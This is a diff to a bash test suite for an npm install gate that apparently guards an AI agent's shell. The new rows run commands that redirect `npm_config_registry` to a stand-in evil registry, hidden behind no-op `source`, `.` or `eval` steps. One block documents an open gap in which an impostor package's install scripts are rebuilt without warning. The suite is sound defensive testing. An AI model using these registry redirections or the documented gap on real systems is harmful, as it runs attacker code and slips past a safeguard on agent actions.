@@ -573,8 +573,9 @@ ROWS
 #     public registry with no integrity cannot be matched and is not rebuilt
 #     (P7). The bytes leaving the tree releases it (P6), and P0 is two approved
 #     installs. The rebuild used to run EVIL for P1-P5, P1x and P7.
-#     An install after `source`, `.` or `eval` is not among them, on purpose:
-#     the SRC rows below.
+#     An install after `source`, `.` or `eval` that npm answers for with the
+#     public registry is not among them, on purpose: the SRC rows below. One
+#     whose own words name another registry is (the VB rows).
 #   Q1-Q5: the same, where the first command fetched bytes a committed
 #     lockfile already named, so only the tree from before the command says
 #     what was already there. A clone with the impostor's integrity in its
@@ -883,11 +884,13 @@ new_dp1() {
 # assignment (UK1v), and `set -a` beside a `source` (MX1).
 #
 # Code the command runs first is the exception (UK0, UK1, and the SRC rows):
-# after `source`, `.` or `eval`, the install's scripts are withheld for that
-# command, but nothing is recorded and the tree is not left observed. That code
-# ran in the agent's shell and could already have run anything, so a record
-# would protect nothing, and UK0 and UK1 measured what it cost: every package
-# of the tree, public ones included, withheld on the whole machine.
+# after `source`, `.` or `eval`, where npm answers the public registry, the
+# install's scripts are withheld for that command, but nothing is recorded and
+# the tree is not left observed. Whoever controls that code already runs code
+# in the agent's shell, so a record would protect nothing against them, and
+# UK0 and UK1 measured what it cost: every package of the tree, public ones
+# included, withheld on the whole machine. Where npm names another registry,
+# its answer is recorded whatever code ran first (the VB rows).
 new_benignenv() { printf 'export SD_BENIGN=1\n' > "${CASE_PROJECT}/sdenv.sh"; }
 unknown_first() {
   local first_home
@@ -919,7 +922,7 @@ new_uk2() {
 # withheld bytes and the observed tree hashes as they were. The row is the next
 # ordinary install in the same project, which npm answers for, and which
 # rebuilds the tree.
-SOURCED_SAYS="It has not recorded these bytes as withheld: that code ran in this shell and could already have run anything, so a record would protect nothing. The next install npm says fetches from the public npm registry rebuilds them as usual"
+SOURCED_SAYS="It has not recorded these bytes as withheld: whoever controls that code already runs code in this shell, so a record would protect nothing against them. The next install npm says fetches from the public npm registry rebuilds them as usual"
 # Either directory may not exist yet, and find then fails, which under
 # pipefail would end the battery: an absent directory is an empty one here.
 home_records() { (cd "${CASE_HOME}" && { find npm-withheld npm-observed -type f -exec cksum {} + 2>/dev/null || true; } | sort); }
@@ -944,6 +947,17 @@ sourced_first() {
 new_src1() { new_clone; sourced_first SRC1 'source ./sdenv.sh && npm ci'; }
 new_src2() { new_project; sourced_first SRC2 '. ./sdenv.sh && npm install sd-approved@1.0.0'; }
 new_src3() { new_clone; sourced_first SRC3 'eval "export SD_BENIGN=1" && npm ci'; }
+# The VB rows: code ahead of an install whose registry the command itself
+# names. npm answers for the command's own words, and an answer that is not
+# the public registry stands and is recorded as P1's and EXP1's are, whatever
+# code runs before it (VB1-VB3). Code whose own text names an npm setting is a
+# setting the gate reads but does not reproduce, recorded as UK1v's is (EV1).
+# Code that is a no-op used to discard npm's answer, so nothing was recorded
+# and the next approved install rebuilt the impostor (VB1-VB3, EV1).
+new_vb1() { new_project; withhold_first ". /dev/null; ${RH3_FORM}"; }
+new_vb2() { new_project; withhold_first "eval true; export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0"; }
+new_vb3() { new_project; withhold_first "source /dev/null && export npm_config_registry=${EVIL_REG} && npm install sd-approved@1.0.0"; }
+new_ev1() { new_project; withhold_first "eval \"export npm_config_registry=${EVIL_REG}\"; npm install sd-approved@1.0.0"; }
 
 # <id>|<fixture>|<engine>|<expect>|<command>, where <expect> is
 #   fallback            rolled back with no confirmed snapshot, said in all three records
@@ -1103,9 +1117,46 @@ UK2|uk2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 SRC1|src1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 SRC2|src2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 SRC3|src3|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+VB1|vb1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+VB2|vb2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+VB3|vb3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+EV1|ev1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (eval npm_config_registry) can change the environment npm runs with|npm install sd-swapped@1.0.0
 ROWS
 [[ ${#FAILURES[@]} -ne ${failures_before} ]] \
   || pass "install scripts run only over a tree on record from the public registry or a workspace, a package counts as bundled only where its parent's package.json bundles it, a record on the public registry counts only where npm says it fetched from there, a rollback runs none without a confirmed snapshot and says what ran on each engine, and K4-K7 are installed but not rebuilt"
+
+# VB4, a boundary pinned as it stands. A file the command sources exports
+# npm_config_registry, so the setting is in code this gate does not read, npm
+# answers the public registry for the words it can see, and nothing is
+# recorded: whoever controls that file already runs code in the agent's shell.
+# The impostor's registry serves registry.npmjs.org tarball URLs (as RH1's
+# does), so the next approved install reads the record as public and rebuilds
+# the impostor's bytes, all three scripts, with no warning. When a release
+# closes this, the row goes red and the boundary in ARCHITECTURE.md moves with
+# it.
+failures_before=${#FAILURES[@]}
+new_evilenvfile
+vb4_before=$(home_records)
+run_install '. ./npmenv.sh && npm install sd-approved@1.0.0'
+vb4_first_ran="${CASE_RAN}" vb4_first_post="${CASE_POST}"
+grep -q 'EVIL-sd-approved' "${CASE_PROJECT}/node_modules/sd-approved/mark.js" 2>/dev/null \
+  || note_failure "VB4: the first command installs the impostor, or the row tests nothing"
+: > "${MARKS}"
+run_install 'npm install sd-swapped@1.0.0'
+printf 'VB4  claude  . ./npmenv.sh && npm install sd-approved@1.0.0, then npm install sd-swapped@1.0.0 | first ran=[%s] ran=[%s] post=[%s]\n' \
+  "$(cut -f1,2 <<< "${vb4_first_ran}" | tr '\t' ':' | paste -sd, -)" "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
+  "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
+[[ -z "${vb4_first_ran}" ]] || note_failure "VB4: the first command rebuilds nothing (${vb4_first_ran})"
+grep -qF "${SOURCED_SAYS}" <<< "${vb4_first_post}" \
+  || note_failure "VB4: the first command's warning says why nothing is recorded (post: ${vb4_first_post:0:400})"
+[[ "$(home_records)" == "${vb4_before}" ]] || note_failure "VB4: the first command records nothing withheld ($(home_records | paste -sd' ' -))"
+[[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] && ! rolled_back \
+  || note_failure "VB4: the next approved install is kept (deny: ${CASE_PRE_DENY:0:160}, rc ${CASE_INSTALL_RC}, post: ${CASE_POST:0:300})"
+[[ -z "${CASE_POST}" ]] || note_failure "VB4: the next approved install confirms quietly, as the boundary stands (post: ${CASE_POST:0:300})"
+[[ "$(grep -c '^EVIL' <<< "${CASE_RAN}" || true)" == 3 ]] \
+  || note_failure "VB4: the next approved install rebuilds the impostor's three scripts, as the boundary stands (${CASE_RAN:-nothing ran})"
+[[ ${#FAILURES[@]} -ne ${failures_before} ]] \
+  || pass "VB4: after a sourced file that names the registry, nothing is recorded and the next approved install rebuilds what it served (the boundary as it stands)"
 
 # LK1. Each lockfile field the rebuild's check reads vouches for less than it
 # seems to (ARCHITECTURE.md tables them), and every gap is held by a row:
